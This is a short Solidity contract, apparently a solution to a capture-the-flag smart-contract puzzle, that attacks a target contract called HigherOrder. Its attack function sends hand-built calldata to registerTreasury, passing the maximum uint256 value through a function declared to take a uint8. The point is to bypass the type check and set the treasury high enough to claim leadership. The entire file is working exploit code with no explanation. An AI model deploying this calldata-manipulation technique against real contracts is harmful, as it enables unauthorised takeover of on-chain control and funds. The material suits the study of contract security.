// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface HigherOrder {
    function registerTreasury(uint8) external;
    function claimLeadership() external;
}

contract HigherOrderAttack {
    address hoAddress;

    constructor(address _hoAddress) {
        hoAddress = _hoAddress;
    }

    function attack() external {
        hoAddress.call(
            abi.encodePacked(
                HigherOrder.registerTreasury.selector,
                abi.encode(type(uint256).max)
            )
        );
    }
}
